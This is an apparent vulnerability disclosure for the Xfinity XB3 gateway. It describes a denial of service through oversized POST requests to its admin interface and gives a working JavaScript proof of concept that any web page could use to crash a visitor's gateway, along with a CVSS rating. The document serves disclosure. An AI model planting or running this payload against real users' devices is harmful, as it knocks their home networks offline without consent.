# Xfinity Gateway XB3 - DoS Via Large POST Request
The administrative interface of Xfinity Gateway model XB3 (and possibly others) does not enforce a max POST request size. Any website is able to send a large POST request to the gateway at `10.0.0.1`. If the request size is large enough, the device will stop responding and reboot, leading to a Denial of Service condition due to memory exhaustion.

## Proof of Concept
The following JavaScript will crash an XB3 gateway if a website visitor stays on the page long enough:

    (() => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'http://10.0.0.1');
      xhr.send('A'.repeat(99999999));
    })();

## Mitigating Factors
During testing it took an average of 80 seconds to post enough data to cause this crash, so a website exploiting this bug would need to convince the user to wait around long enough to finish posting the payload.

## Impact
6.5 - Medium (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H)
